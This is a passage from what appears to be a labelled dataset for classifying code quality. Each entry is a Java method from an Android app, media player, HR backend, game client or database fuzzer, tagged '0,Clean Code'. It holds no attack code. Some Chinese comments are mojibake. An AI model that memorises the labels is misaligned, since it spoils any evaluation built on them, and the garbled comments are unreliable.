      Map<String,ClusterInfo> clusterInfoMap=getStringClusterInfoMap(service);
      serviceDetailInfo.setClusterMap(clusterInfoMap);
      serviceDetailInfoList.add(serviceDetailInfo);
    }
    return serviceDetailInfoList;
  }
 else {
    return serviceList(request);
  }
}",0,Clean Code
"/** 
 * Assert that the given text does not contain the given substring. <pre class=""code"">Assert.doesNotContain(name, ""rod"", ""Name must not contain 'rod'"");</pre>
 * @param textToSearch the text to search
 * @param substring the substring to find within the text
 * @param message the exception message to use if the assertion fails
 */
public static void doesNotContain(String textToSearch,String substring,String message){
  if (StringUtils.hasLength(textToSearch) && StringUtils.hasLength(substring) && textToSearch.indexOf(substring) != -1) {
    throw new IllegalArgumentException(message);
  }
}
/** 
 * Assert that the given text does not contain the given substring. <pre class=""code"">Assert.doesNotContain(name, ""rod"");</pre>
 * @param textToSearch the text to search
 * @param substring the substring to find within the text
 */
public static void doesNotContain(String textToSearch,String substring){
  doesNotContain(textToSearch,substring,""[Assertion failed] - this String argument must not contain the substring ["" + substring + ""]"");
}",0,Clean Code
"public SharedPhotoVideoCell2(Context context,SharedResources sharedResources,int currentAccount){
  super(context);
  this.sharedResources=sharedResources;
  this.currentAccount=currentAccount;
  setChecked(false,false);
  imageReceiver.setParentView(this);
  blurImageReceiver.setParentView(this);
  imageReceiver.setDelegate((imageReceiver1,set,thumb,memCache) -> {
    if (set && !thumb && currentMessageObject != null && currentMessageObject.hasMediaSpoilers() && imageReceiver.getBitmap() != null) {
      if (blurImageReceiver.getBitmap() != null) {
        blurImageReceiver.getBitmap().recycle();
      }
      blurImageReceiver.setImageBitmap(Utilities.stackBlurBitmapMax(imageReceiver.getBitmap()));
    }
  }
);
}",0,Clean Code
"public GlStateUniformAttributes initFromGlState(float partialTicks,@NonNull Minecraft mc){
  if (OF && (PUnsafe.getInt(mc.gameSettings,OF_FOGTYPE_OFFSET) == OF_OFF && PUnsafe.getBoolean(mc.entityRenderer,OF_ENTITYRENDERER_FOGSTANDARD_OFFSET))) {
    GlStateManager.disableFog();
  }
{
    this.initModelViewProjectionMatrix();
    Entity entity=mc.getRenderViewEntity();
    double x=entity.lastTickPosX + (entity.posX - entity.lastTickPosX) * partialTicks;
    double y=entity.lastTickPosY + (entity.posY - entity.lastTickPosY) * partialTicks;
    double z=entity.lastTickPosZ + (entity.posZ - entity.lastTickPosZ) * partialTicks;
    this.positionFloorX=floorI(x);
    this.positionFloorY=floorI(y);
    this.positionFloorZ=floorI(z);
    this.positionFracX=(float)frac(x);
    this.positionFracY=(float)frac(y);
    this.positionFracZ=(float)frac(z);
  }
{
    this.initFogColor();
    this.fogDensity=glGetFloat(GL_FOG_DENSITY);
    this.fogStart=glGetFloat(GL_FOG_START);
    this.fogEnd=glGetFloat(GL_FOG_END);
    this.fogScale=1.0f / (this.fogEnd - this.fogStart);
  }
  return this;
}",0,Clean Code
"/** 
 * Returns the metadata associated with this document.
 * @return the metadata.
 */
public Metadata metadata(){
  return metadata;
}
/** 
 * Looks up the metadata value for the given key.
 * @param key the key to look up.
 * @return the metadata value for the given key, or null if the key is not present.
 */
public String metadata(String key){
  return metadata.get(key);
}
",0,Clean Code
"@RequestMapping(value=""/suggest"",method=RequestMethod.GET) public TeslaBaseResult suggest(String category,String query,int page,int size) throws Exception {
  int from=(page - 1) * size;
  List<BackendStoreDTO> backendStoreDTOs=elasticSearchHttpApiBasic.getSearchBackendStores(category,"""");
  JSONObject params=new JSONObject();
  String product=category.split(""_"").length == 3 ? category.split(""_"")[1] : null;
  if (StringUtils.isNotEmpty(product)) {
    params.put(""product"",String.format(""%s"",product));
    params.put(""buCode"",teslasearchService.getUserBuCode(getUserEmployeeId()));
  }
  JSONObject queryGrammarJson=getQueryGrammar.getByCategory(category,null,null,query,params,null,from,size * 2,true);
  addFunctionScore(queryGrammarJson,category);
  log.info(queryGrammarJson.toJSONString());
  System.out.println(queryGrammarJson.toJSONString());
  JSONArray suggests=new JSONArray();
  List<JSONObject> retJsons=elasticSearchSearchService.searchByBackendStores(backendStoreDTOs,null,JSONObject.toJSONString(queryGrammarJson),RequestMethod.POST);
  suggests.addAll(elasticSearchSearchService.getSuggestByRet(category,retJsons));
  JSONArray retArray=new JSONArray();
  retArray.addAll(suggests.subList(0,Math.min(suggests.size(),size)));
  return buildSucceedResult(JSONArray.parseArray(retArray.toString(),JSONObject.class));
}",0,Clean Code
"private static void initFlyway(DataSource dataSource){
  String currentVersion=ConfigUtils.getLocalVersion();
  ConfigJson configJson=ConfigUtils.getConfig();
  if (StringUtils.isNotBlank(currentVersion) && configJson != null && StringUtils.equals(currentVersion,configJson.getLatestStartupSuccessVersion())) {
    return;
  }
 else {
    Flyway flyway=Flyway.configure().dataSource(dataSource).locations(""classpath:db/migration"").load();
    flyway.migrate();
    configJson.setLatestStartupSuccessVersion(currentVersion);
    ConfigUtils.setConfig(configJson);
  }
}
",0,Clean Code
"public static SentenceSuggestionsInfo reconstructSuggestions(SentenceTextInfoParams originalTextInfoParams,SuggestionsInfo[] results){
  if (results == null || results.length == 0) {
    return null;
  }
  if (originalTextInfoParams == null) {
    return null;
  }
  final int originalCookie=originalTextInfoParams.mOriginalTextInfo.getCookie();
  final int originalSequence=originalTextInfoParams.mOriginalTextInfo.getSequence();
  final int querySize=originalTextInfoParams.mSize;
  final int[] offsets=new int[querySize];
  final int[] lengths=new int[querySize];
  final SuggestionsInfo[] reconstructedSuggestions=new SuggestionsInfo[querySize];
  for (int i=0; i < querySize; ++i) {
    final SentenceWordItem item=originalTextInfoParams.mItems.get(i);
    SuggestionsInfo result=null;
    for (    final SuggestionsInfo cur : results) {
      if (cur != null && cur.getSequence() == item.mTextInfo.getSequence()) {
        result=cur;
        result.setCookieAndSequence(originalCookie,originalSequence);
        break;
      }
    }
    offsets[i]=item.mStart;
    lengths[i]=item.mLength;
    reconstructedSuggestions[i]=result != null ? result : EMPTY_SUGGESTIONS_INFO;
  }
  return new SentenceSuggestionsInfo(reconstructedSuggestions,offsets,lengths);
}",0,Clean Code
"/** 
 * Patches a method.
 * @param forClass   Class to patch.
 * @param fn         Method to patch.
 * @param paramTypes Parameters of the <code>fn</code>. Useful for patching individual overloads.
 * @param hook       Callback for the patch.
 * @return A {@link Runnable} object.
 */
public Runnable patch(@NonNull String forClass,@NonNull String fn,@NonNull Class<?>[] paramTypes,@NonNull XC_MethodHook hook){
  return createUnpatch(Patcher.addPatch(forClass,fn,paramTypes,hook));
}
/** 
 * Patches a method.
 * @param clazz      Class to patch.
 * @param fn         Method to patch.
 * @param paramTypes Parameters of the <code>fn</code>. Useful for patching individual overloads.
 * @param hook       Callback for the patch.
 * @return Method that will remove the patch when invoked
 */
public Runnable patch(@NonNull Class<?> clazz,@NonNull String fn,@NonNull Class<?>[] paramTypes,@NonNull XC_MethodHook hook){
  return createUnpatch(Patcher.addPatch(clazz,fn,paramTypes,hook));
}
/** 
 * Patches a method or constructor.
 * @param m    Method or constructor to patch. see {@link Member}.
 * @param hook Callback for the patch.
 * @return Method that will remove the patch when invoked
 */
public Runnable patch(@NonNull Member m,@NonNull XC_MethodHook hook){
  return createUnpatch(Patcher.addPatch(m,hook));
}
/** 
 * Patches a method or constructor.
 * @param m    Method or constructor to patch. see {@link Member}.
 * @param callback Callback for the patch.
 * @return Method that will remove the patch when invoked
 */
public Runnable patch(@NonNull Member m,@NonNull Action1<XC_MethodHook.MethodHookParam> callback){
  return createUnpatch(Patcher.addPatch(m,new Hook(callback)));
}",0,Clean Code
"/** 
 * Returns the value with the closest timestamp to the given timestamp. Removes all older values including the returned one from the buffer.
 * @param timestamp The timestamp value.
 * @return The value with the closest timestamp or null if the buffer is empty.
 * @see #pollFloor(long)
 */
public synchronized @Nullable V poll(long timestamp){
  return poll(timestamp,false);
}
/** 
 * Returns the value with the closest timestamp to the given timestamp. Removes all older values including the returned one from the buffer.
 * @param timestamp The timestamp value.
 * @param onlyOlder Whether this method can return a new value in case its timestamp value isclosest to  {@code timestamp}.
 * @return The value with the closest timestamp or null if the buffer is empty or there is noolder value and  {@code onlyOlder} is true.
 */
private @Nullable V poll(long timestamp,boolean onlyOlder){
  V value=null;
  long previousTimeDiff=Long.MAX_VALUE;
  while (size > 0) {
    long timeDiff=timestamp - timestamps[first];
    if (timeDiff < 0 && (onlyOlder || -timeDiff >= previousTimeDiff)) {
      break;
    }
    previousTimeDiff=timeDiff;
    value=values[first];
    values[first]=null;
    first=(first + 1) % values.length;
    size--;
  }
  return value;
}",0,Clean Code
"private MemberType checkSetterType(JCAssign assign){
  if (assign.lhs instanceof JCFieldAccess && ((JCFieldAccess)(assign).lhs).selected instanceof JCIdent && memberRecord.privateOrFinalFields.contains(((JCFieldAccess)(assign).lhs).name.toString())) {
    return checkSourceClassOrIns(((JCIdent)((JCFieldAccess)(assign).lhs).selected).name);
  }
  return MemberType.NON_PRIVATE;
}
",0,Clean Code
"@CallSuper public void onPause(){
  if (actionBar != null) {
    actionBar.onPause();
  }
  isPaused=true;
  try {
    if (visibleDialog != null && visibleDialog.isShowing() && dismissDialogOnPause(visibleDialog)) {
      visibleDialog.dismiss();
      visibleDialog=null;
    }
  }
 catch (  Exception e) {
    FileLog.e(e);
  }
  if (getLastStoryViewer() != null) {
    getLastStoryViewer().onPause();
    getLastStoryViewer().updatePlayingMode();
  }
}
",0,Clean Code
"/** 
 * Returns a maximum input size suitable for configuring a codec for  {@code format} in a way thatwill allow possible adaptation to other compatible formats in  {@code streamFormats}.
 * @param codecInfo A {@link MediaCodecInfo} describing the decoder.
 * @param format The format for which the codec is being configured.
 * @param streamFormats The possible stream formats.
 * @return A suitable maximum input size.
 */
protected int getCodecMaxInputSize(MediaCodecInfo codecInfo,Format format,Format[] streamFormats){
  int maxInputSize=getCodecMaxInputSize(codecInfo,format);
  if (streamFormats.length == 1) {
    return maxInputSize;
  }
  for (  Format streamFormat : streamFormats) {
    if (codecInfo.isSeamlessAdaptationSupported(format,streamFormat,false)) {
      maxInputSize=Math.max(maxInputSize,getCodecMaxInputSize(codecInfo,streamFormat));
    }
  }
  return maxInputSize;
}
/** 
 * Returns a maximum input buffer size for a given format.
 * @param codecInfo A {@link MediaCodecInfo} describing the decoder.
 * @param format The format.
 * @return A maximum input buffer size in bytes, or {@link Format#NO_VALUE} if a maximum could notbe determined.
 */
private int getCodecMaxInputSize(MediaCodecInfo codecInfo,Format format){
  if (""OMX.google.raw.decoder"".equals(codecInfo.name)) {
    if (Util.SDK_INT < 24 && !(Util.SDK_INT == 23 && Util.isTv(context))) {
      return Format.NO_VALUE;
    }
  }
  return format.maxInputSize;
}",0,Clean Code
"@Override public boolean dispatchKeyEventPreIme(KeyEvent event){
  if (event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_UP || event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_DOWN) {
    dispatchVolumeEvent(event);
    return true;
  }
  if (event != null && event.getKeyCode() == KeyEvent.KEYCODE_BACK && event.getAction() == KeyEvent.ACTION_UP) {
    onBackPressed();
    return true;
  }
  return super.dispatchKeyEventPreIme(event);
}
",0,Clean Code
"@NotNull private ChangeListener<String> getProxyListener(Config config){
  return (observable,oldValue,newValue) -> {
    if (oldValue.trim().equals(newValue.trim())) {
      return;
    }
    String hostAsString=getHost(proxyHost.getText());
    Integer portAsInteger=getPort(proxyPort.getText());
    if (hostAsString != null && portAsInteger != null && isValidPort(portAsInteger)) {
      config.setProxyServer(HostAndPort.fromParts(hostAsString,portAsInteger).toString());
    }
 else     if (hostAsString != null) {
      config.setProxyServer(HostAndPort.fromHost(hostAsString).toString());
    }
  }
;
}
",0,Clean Code
"/** 
 * 鑾峰彇group鍘嗗彶娑堣垂鎸囨爣
 */
@PostMapping(""/topic/consumer_offsets/chart"") public RestResponse getOffsetStats(@RequestBody Map<String,String> queryMap){
  String clusterID=queryMap.get(Constants.KeyStr.CLUSTERID);
  String topic=queryMap.get(BrokerConfig.TOPIC);
  String group=queryMap.get(BrokerConfig.GROUP);
  String type=queryMap.get(Constants.JsonObject.TYPE);
  if (StringUtils.isBlank(clusterID) || StringUtils.isBlank(topic) || StringUtils.isBlank(group)|| StringUtils.isBlank(type)) {
    return ERROR(""clusterID topic group and type must not blank."");
  }
  String start=queryMap.get(""start"");
  String end=queryMap.get(""end"");
  return SUCCESS_DATA(elasticsearchService.queryOffset(clusterID,topic,group,type,start,end));
}
",0,Clean Code
"@EventHandler private void onReceivePacket(PacketEvent.Receive event){
  if (!totemPops.get())   return;
  if (!(event.packet instanceof EntityStatusS2CPacket))   return;
  if (p.getStatus() != 35)   return;
  Entity entity=p.getEntity(mc.world);
  if (!(entity instanceof PlayerEntity))   return;
  if ((entity.equals(mc.player) && totemsIgnoreOwn.get()) || (Friends.get().isFriend(((PlayerEntity)entity)) && totemsIgnoreOthers.get()) || (!Friends.get().isFriend(((PlayerEntity)entity)) && totemsIgnoreFriends.get()))   return;
synchronized (totemPopMap) {
    int pops=totemPopMap.getOrDefault(entity.getUuid(),0);
    totemPopMap.put(entity.getUuid(),++pops);
    ChatUtils.sendMsg(getChatId(entity),Formatting.GRAY,""(highlight)%s (default)popped (highlight)%d (default)%s."",entity.getName().getString(),pops,pops == 1 ? ""totem"" : ""totems"");
  }
}",0,Clean Code
"private void buildAndPrepareAudioSampleStreamWrappers(long positionUs,List<Rendition> audioRenditions,List<HlsSampleStreamWrapper> sampleStreamWrappers,List<int[]> manifestUrlsIndicesPerWrapper,Map<String,DrmInitData> overridingDrmInitData){
  ArrayList<Uri> scratchPlaylistUrls=new ArrayList<>(audioRenditions.size());
  ArrayList<Format> scratchPlaylistFormats=new ArrayList<>(audioRenditions.size());
  ArrayList<Integer> scratchIndicesList=new ArrayList<>(audioRenditions.size());
  HashSet<String> alreadyGroupedNames=new HashSet<>();
  for (int renditionByNameIndex=0; renditionByNameIndex < audioRenditions.size(); renditionByNameIndex++) {
    String name=audioRenditions.get(renditionByNameIndex).name;
    if (!alreadyGroupedNames.add(name)) {
      continue;
    }
    boolean renditionsHaveCodecs=true;
    scratchPlaylistUrls.clear();
    scratchPlaylistFormats.clear();
    scratchIndicesList.clear();
    for (int renditionIndex=0; renditionIndex < audioRenditions.size(); renditionIndex++) {
      if (Util.areEqual(name,audioRenditions.get(renditionIndex).name)) {
        Rendition rendition=audioRenditions.get(renditionIndex);
        scratchIndicesList.add(renditionIndex);
        scratchPlaylistUrls.add(rendition.url);
        scratchPlaylistFormats.add(rendition.format);
        renditionsHaveCodecs&=rendition.format.codecs != null;
      }
    }
    HlsSampleStreamWrapper sampleStreamWrapper=buildSampleStreamWrapper(C.TRACK_TYPE_AUDIO,scratchPlaylistUrls.toArray(new Uri[0]),scratchPlaylistFormats.toArray(new Format[0]),null,Collections.emptyList(),overridingDrmInitData,positionUs);
    manifestUrlsIndicesPerWrapper.add(Util.toArray(scratchIndicesList));
    sampleStreamWrappers.add(sampleStreamWrapper);
    if (allowChunklessPreparation && renditionsHaveCodecs) {
      Format[] renditionFormats=scratchPlaylistFormats.toArray(new Format[0]);
      sampleStreamWrapper.prepareWithMasterPlaylistInfo(new TrackGroupArray(new TrackGroup(renditionFormats)),0,TrackGroupArray.EMPTY);
    }
  }
}",0,Clean Code
"/** 
 * Test whether zipCode matches the U.S. zip code format (ddddd or ddddd-dddd) and is within the expected range, given that stateMatch is a match of sStateRe.
 * @return true if zipCode is a valid zip code, is legal for thematched state, and is followed by a word delimiter or the end of the string.
 */
private static boolean isValidZipCode(String zipCode,MatchResult stateMatch){
  if (stateMatch == null)   return false;
  int stateIndex=stateMatch.groupCount();
  while (stateIndex > 0) {
    if (stateMatch.group(stateIndex--) != null)     break;
  }
  return sZipCodeRe.matcher(zipCode).matches() && sStateZipCodeRanges[stateIndex].matches(zipCode);
}
/** 
 * Test whether zipCode matches the U.S. zip code format (ddddd or ddddd-dddd) and is within the expected range, given that state holds a string that will match sStateRe.
 * @return true if zipCode is a valid zip code, is legal for thegiven state, and is followed by a word delimiter or the end of the string.
 */
@VisibleForTesting public static boolean isValidZipCode(String zipCode,String state){
  return isValidZipCode(zipCode,matchState(state,0));
}
/** 
 * Test whether zipCode matches the U.S. zip code format (ddddd or ddddd-dddd).
 * @return true if zipCode is a valid zip code followed by a worddelimiter or the end of the string.
 */
@VisibleForTesting public static boolean isValidZipCode(String zipCode){
  return sZipCodeRe.matcher(zipCode).matches();
}",0,Clean Code
"public BasePage(){
}
/** 
 * 鍒嗛〉鏋勯�犲嚱鏁�
 * @param current 褰撳墠椤�
 * @param size    姣忛〉鏄剧ず鏉℃暟
 */
public BasePage(long current,long size){
  this(current,size,0);
}
public BasePage(long current,long size,long total){
  this(current,size,total,true);
}
public BasePage(long current,long size,boolean isSearchCount){
  this(current,size,0,isSearchCount);
}
public BasePage(long current,long size,long total,boolean isSearchCount){
  if (current > 1) {
    this.pageNumber=current;
  }
  this.pageSize=size;
  this.totalRow=total;
  this.isSearchCount=isSearchCount;
}",0,Clean Code
"/** 
 * Add an event point to this gesture stroke recognition points. Returns true if the event point is on the valid gesture area.
 * @param x the x-coordinate of the event point
 * @param y the y-coordinate of the event point
 * @param time the elapsed time in millisecond from the first gesture down
 * @param isMajorEvent false if this is a historical move event
 * @return true if the event point is on the valid gesture area
 */
public boolean addEventPoint(final int x,final int y,final int time,final boolean isMajorEvent){
  final int size=getLength();
  if (size <= 0) {
    appendPoint(x,y,time);
    updateMajorEvent(x,y,time);
  }
 else {
    final int distance=detectFastMove(x,y,time);
    if (distance > mGestureSamplingMinimumDistance) {
      appendPoint(x,y,time);
    }
  }
  if (isMajorEvent) {
    updateIncrementalRecognitionSize(x,y,time);
    updateMajorEvent(x,y,time);
  }
  return y >= mMinYCoordinate && y < mMaxYCoordinate;
}",0,Clean Code
"private void updateCommentView(){
  if (!commentViewAnimated || commentView == null) {
    return;
  }
  int top=commentView.getTop();
  if (commentViewPreviousTop > 0 && Math.abs(top - commentViewPreviousTop) > dp(20) && !commentView.isPopupShowing()) {
    if (commentViewIgnoreTopUpdate) {
      commentViewIgnoreTopUpdate=false;
      commentViewPreviousTop=top;
      return;
    }
    if (keyboardAnimator != null) {
      keyboardAnimator.cancel();
    }
    keyboardAnimator=ValueAnimator.ofFloat(commentViewPreviousTop - top,0);
    keyboardAnimator.addUpdateListener(a -> {
      commentView.setTranslationY((float)a.getAnimatedValue());
    }
);
    keyboardAnimator.setDuration(AdjustPanLayoutHelper.keyboardDuration);
    keyboardAnimator.setInterpolator(AdjustPanLayoutHelper.keyboardInterpolator);
    keyboardAnimator.start();
  }
  commentViewPreviousTop=top;
}",0,Clean Code
"private void onGestureMoveEvent(final int x,final int y,final long eventTime,final boolean isMajorEvent,final Key key){
  if (!mIsDetectingGesture) {
    return;
  }
  final boolean onValidArea=mBatchInputArbiter.addMoveEventPoint(x,y,eventTime,isMajorEvent,this);
  if (!onValidArea) {
    cancelBatchInput();
    return;
  }
  mGestureStrokeDrawingPoints.onMoveEvent(x,y,mBatchInputArbiter.getElapsedTimeSinceFirstDown(eventTime));
  if (isShowingPopupKeysPanel()) {
    return;
  }
  if (!sInGesture && key != null && Character.isLetter(key.getCode()) && mBatchInputArbiter.mayStartBatchInput(this)) {
    sListener.resetMetaState();
    sInGesture=true;
  }
  if (sInGesture) {
    if (key != null) {
      mBatchInputArbiter.updateBatchInput(eventTime,this);
    }
    showGestureTrail();
  }
}
",0,Clean Code
"public JSONObject uploadArtifact(String fileName,String fileContent) throws Exception {
  String dirName=""/tmp/uploadArtifact"";
  File dir=new File(dirName);
  if (!dir.exists()) {
    dir.mkdirs();
  }
  File file=new File(dir,fileName);
  if (file.exists()) {
    file.delete();
  }
  Path path=Paths.get(file.getAbsolutePath());
  Files.write(path,fileContent.getBytes());
  log.info(""File created and written: "" + file.getAbsolutePath());
  String uploadUrl=String.format(""%s/artifacts/v1/namespaces/default/artifacts:upload"",applicationProperties.getFlinkVvpEndpoint());
  HttpResponse<String> response=Requests.upload(file,uploadUrl,null,null);
  return JSONObject.parseObject(response.body());
}",0,Clean Code
"@Override @Transactional(rollbackFor=Exception.class) public void confirmEntry(AddEmployeeFieldManageBO addEmployeeFieldManageBO){
  List<AddEmployeeFieldManageBO.EmployeeFieldBO> employeeFieldList=addEmployeeFieldManageBO.getEmployeeFieldList();
  List<AddEmployeeFieldManageBO.EmployeeFieldBO> postFieldList=addEmployeeFieldManageBO.getPostFieldList();
  List<AddEmployeeFieldManageBO.EmployeeFieldBO> employeeDataList=Stream.concat(employeeFieldList.stream(),postFieldList.stream()).collect(Collectors.toList());
  Map<FiledIsFixedEnum,List<AddEmployeeFieldManageBO.EmployeeFieldBO>> isFixedMap=getIsFixedMap(employeeDataList);
  List<AddEmployeeFieldManageBO.EmployeeFieldBO> fixedEmployeeData=isFixedMap.get(FiledIsFixedEnum.FIXED);
  JSONObject jsonObject=new JSONObject();
  fixedEmployeeData.forEach(employeeData -> jsonObject.put(employeeData.getFieldName(),employeeData.getFieldValue()));
  HrmEmployee employee=jsonObject.toJavaObject(HrmEmployee.class);
  employee.setEmployeeId(addEmployeeFieldManageBO.getEmployeeId());
  Integer count=lambdaQuery().eq(HrmEmployee::getJobNumber,employee.getJobNumber()).ne(HrmEmployee::getEmployeeId,employee.getEmployeeId()).count();
  if (count > 0) {
    throw new CrmException(HrmCodeEnum.JOB_NUMBER_EXISTED,employee.getJobNumber());
  }
  employee.setEntryStatus(EmployeeEntryStatus.IN.getValue());
  if (employee.getEmploymentForms() == EmploymentFormsEnum.OFFICIAL.getValue()) {
    Integer probation=employee.getProbation();
    if (probation == 0) {
      employee.setStatus(EmployeeStatusEnum.OFFICIAL.getValue());
      employee.setBecomeTime(employee.getEntryTime());
    }
 else {
      employee.setStatus(EmployeeStatusEnum.TRY_OUT.getValue());
      employee.setBecomeTime(DateUtil.offsetMonth(employee.getEntryTime(),probation));
    }
  }
  updateById(employee);
  abnormalChangeRecordService.addAbnormalChangeRecord(employee.getEmployeeId(),AbnormalChangeType.NEW_ENTRY,new Date());
  HrmEmployee hrmEmployee=getById(addEmployeeFieldManageBO.getEmployeeId());
  if (hrmEmployee.getCandidateId() != null) {
    candidateService.lambdaUpdate().set(HrmRecruitCandidate::getStatus,CandidateStatusEnum.HAVE_JOINED.getValue()).set(HrmRecruitCandidate::getEntryTime,new Date()).eq(HrmRecruitCandidate::getCandidateId,hrmEmployee.getCandidateId()).update();
  }
}",0,Clean Code
"/** 
 * Sets the buffer duration parameters.
 * @param minBufferMs The minimum duration of media that the player will attempt to ensure isbuffered at all times, in milliseconds.
 * @param maxBufferMs The maximum duration of media that the player will attempt to buffer, inmilliseconds.
 * @param bufferForPlaybackMs The duration of media that must be buffered for playback to start orresume following a user action such as a seek, in milliseconds.
 * @param bufferForPlaybackAfterRebufferMs The default duration of media that must be buffered forplayback to resume after a rebuffer, in milliseconds. A rebuffer is defined to be caused by buffer depletion rather than a user action.
 * @return This builder, for convenience.
 * @throws IllegalStateException If {@link #buildPlayerComponents()} has already been called.
 */
public BufferSizeAdaptationBuilder setBufferDurationsMs(int minBufferMs,int maxBufferMs,int bufferForPlaybackMs,int bufferForPlaybackAfterRebufferMs){
  Assertions.checkState(!buildCalled);
  this.minBufferMs=minBufferMs;
  this.maxBufferMs=maxBufferMs;
  this.bufferForPlaybackMs=bufferForPlaybackMs;
  this.bufferForPlaybackAfterRebufferMs=bufferForPlaybackAfterRebufferMs;
  return this;
}
",0,Clean Code
"private void sendPassphrase(String passphrase){
  Hwi.EnumerateService enumerateService=new Hwi.EnumerateService(passphrase);
  enumerateService.setOnSucceeded(workerStateEvent -> {
    List<Device> devices=enumerateService.getValue();
    for (    Device freshDevice : devices) {
      if (device.getPath().equals(freshDevice.getPath()) && device.getModel().equals(freshDevice.getModel())) {
        device.setFingerprint(freshDevice.getFingerprint());
      }
    }
    if (device.getFingerprint() != null) {
      setPassphraseButton.setVisible(false);
      setDescription(""Passphrase sent"");
      showOperationButton();
    }
 else {
      setError(""Passphrase send failed"",null);
      setPassphraseButton.setDisable(false);
      setPassphraseButton.setVisible(true);
    }
  }
);
  enumerateService.setOnFailed(workerStateEvent -> {
    setError(""Error"",enumerateService.getException().getMessage());
    setPassphraseButton.setDisable(false);
    setPassphraseButton.setVisible(true);
  }
);
  enumerateService.start();
}
",0,Clean Code
"/** 
 * Returns a request builder with Authorization header set if the provided repository specifies credentials
 */
private HttpSender.Request.Builder applyAuthenticationToRequest(MavenRepository repository,HttpSender.Request.Builder request){
  if (ctx.getSettings() != null && ctx.getSettings().getServers() != null) {
    for (    MavenSettings.Server server : ctx.getSettings().getServers().getServers()) {
      if (server.getId().equals(repository.getId()) && server.getConfiguration() != null && server.getConfiguration().getHttpHeaders() != null) {
        for (        MavenSettings.HttpHeader header : server.getConfiguration().getHttpHeaders()) {
          request.withHeader(header.getName(),header.getValue());
        }
      }
    }
  }
  if (hasCredentials(repository)) {
    return request.withBasicAuthentication(repository.getUsername(),repository.getPassword());
  }
  return request;
}
",0,Clean Code
"@Override public void onScrolled(@NonNull androidx.recyclerview.widget.RecyclerView recyclerView,int dx,int dy){
  if (mFolderShortInfo == null) {
    return;
  }
  if (dy < 0 && mFolderShortInfo.canWrite && !fabGroup.isShown()) {
    fabGroup.show();
  }
 else   if (dy > 0 && fabGroup.isShown()) {
    fabGroup.hide();
  }
}",0,Clean Code
"protected void aggregateCheck() throws SQLException {
  PostgresAggregateFunction aggregateFunction=Randomly.fromOptions(PostgresAggregateFunction.MAX,PostgresAggregateFunction.MIN,PostgresAggregateFunction.SUM,PostgresAggregateFunction.BIT_AND,PostgresAggregateFunction.BIT_OR,PostgresAggregateFunction.BOOL_AND,PostgresAggregateFunction.BOOL_OR,PostgresAggregateFunction.COUNT);
  PostgresAggregate aggregate=gen.generateArgsForAggregate(aggregateFunction.getRandomReturnType(),aggregateFunction);
  List<PostgresExpression> fetchColumns=new ArrayList<>();
  fetchColumns.add(aggregate);
  while (Randomly.getBooleanWithRatherLowProbability()) {
    fetchColumns.add(gen.generateAggregate());
  }
  select.setFetchColumns(Arrays.asList(aggregate));
  if (Randomly.getBooleanWithRatherLowProbability()) {
    select.setOrderByClauses(gen.generateOrderBy());
  }
  originalQuery=PostgresVisitor.asString(select);
  firstResult=getAggregateResult(originalQuery);
  metamorphicQuery=createMetamorphicUnionQuery(select,aggregate,select.getFromList());
  secondResult=getAggregateResult(metamorphicQuery);
  String queryFormatString=""-- %s;\n-- result: %s"";
  String firstQueryString=String.format(queryFormatString,originalQuery,firstResult);
  String secondQueryString=String.format(queryFormatString,metamorphicQuery,secondResult);
  state.getState().getLocalState().log(String.format(""%s\n%s"",firstQueryString,secondQueryString));
  if (firstResult == null && secondResult != null || firstResult != null && secondResult == null || firstResult != null && !firstResult.contentEquals(secondResult) && !ComparatorHelper.isEqualDouble(firstResult,secondResult)) {
    if (secondResult != null && secondResult.contains(""Inf"")) {
      throw new IgnoreMeException();
    }
    String assertionMessage=String.format(""the results mismatch!\n%s\n%s"",firstQueryString,secondQueryString);
    throw new AssertionError(assertionMessage);
  }
}
",0,Clean Code
"public static void infect(char[][] board,int i,int j){
  if (i < 0 || i == board.length || j < 0 || j == board[0].length || board[i][j] != '1') {
    return;
  }
  board[i][j]=0;
  infect(board,i - 1,j);
  infect(board,i + 1,j);
  infect(board,i,j - 1);
  infect(board,i,j + 1);
}",0,Clean Code
"public int layout(final SuggestedWords suggestedWords,final int fromIndex,final int maxWidth,final int minWidth,final int maxRow,final Paint paint,final Context context){
  clearKeys();
  mDivider=ContextCompat.getDrawable(context,R.drawable.more_suggestions_divider);
  mDividerWidth=mDivider == null ? 0 : mDivider.getIntrinsicWidth();
  final float padding=context.getResources().getDimension(R.dimen.config_more_suggestions_key_horizontal_padding);
  int row=0;
  int index=fromIndex;
  int rowStartIndex=fromIndex;
  final int size=Math.min(suggestedWords.size(),SuggestedWords.MAX_SUGGESTIONS);
  while (index < size) {
    final String word;
    if (isIndexSubjectToAutoCorrection(suggestedWords,index)) {
      word=suggestedWords.getLabel(SuggestedWords.INDEX_OF_TYPED_WORD);
    }
 else {
      word=suggestedWords.getLabel(index);
    }
    mWidths[index]=(int)(TypefaceUtils.getStringWidth(word,paint) + padding);
    final int numColumn=index - rowStartIndex + 1;
    final int columnWidth=(maxWidth - mDividerWidth * (numColumn - 1)) / numColumn;
    if (numColumn > MAX_COLUMNS_IN_ROW || !fitInWidth(rowStartIndex,index + 1,columnWidth)) {
      if ((row + 1) >= maxRow) {
        break;
      }
      mNumColumnsInRow[row]=index - rowStartIndex;
      rowStartIndex=index;
      row++;
    }
    mColumnOrders[index]=index - rowStartIndex;
    mRowNumbers[index]=row;
    index++;
  }
  mNumColumnsInRow[row]=index - rowStartIndex;
  mNumRows=row + 1;
  mBaseWidth=mOccupiedWidth=Math.max(minWidth,calcurateMaxRowWidth(fromIndex,index));
  mBaseHeight=mOccupiedHeight=mNumRows * mDefaultAbsoluteRowHeight + mVerticalGap;
  return index - fromIndex;
}
public Builder layout(final SuggestedWords suggestedWords,final int fromIndex,final int maxWidth,final int minWidth,final int maxRow,final Keyboard parentKeyboard){
  final int xmlId=R.xml.kbd_suggestions_pane_template;
  mParams.mId=parentKeyboard.mId;
  readAttributes(xmlId);
  mParams.mVerticalGap=mParams.mTopPadding=parentKeyboard.mVerticalGap / 2;
  mPaneView.updateKeyboardGeometry(mParams.mDefaultAbsoluteRowHeight);
  final int count=mParams.layout(suggestedWords,fromIndex,maxWidth,minWidth,maxRow,mPaneView.newLabelPaint(null),getMContext());
  mFromIndex=fromIndex;
  mToIndex=fromIndex + count;
  mSuggestedWords=suggestedWords;
  return this;
}",0,Clean Code
"@Override protected void onSearchStateChanged(boolean expanded){
  AndroidUtilities.removeAdjustResize(getParentActivity(),classGuid);
